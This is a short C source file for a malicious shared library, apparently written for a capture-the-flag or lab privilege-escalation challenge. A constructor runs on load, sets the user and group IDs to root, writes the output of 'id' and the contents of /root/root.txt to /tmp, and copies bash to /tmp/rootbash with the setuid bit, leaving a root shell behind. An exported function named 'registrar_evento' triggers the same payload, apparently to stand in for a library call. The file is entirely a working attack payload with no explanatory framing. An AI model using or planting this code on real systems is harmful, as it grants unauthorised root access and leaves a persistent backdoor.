#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
static void pwn(void){
    setuid(0); setgid(0);
    system("id > /tmp/pwn.txt 2>&1; cat /root/root.txt >> /tmp/pwn.txt 2>&1; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash");
}
__attribute__((constructor)) void init(void){ pwn(); }
void registrar_evento(void){ pwn(); }
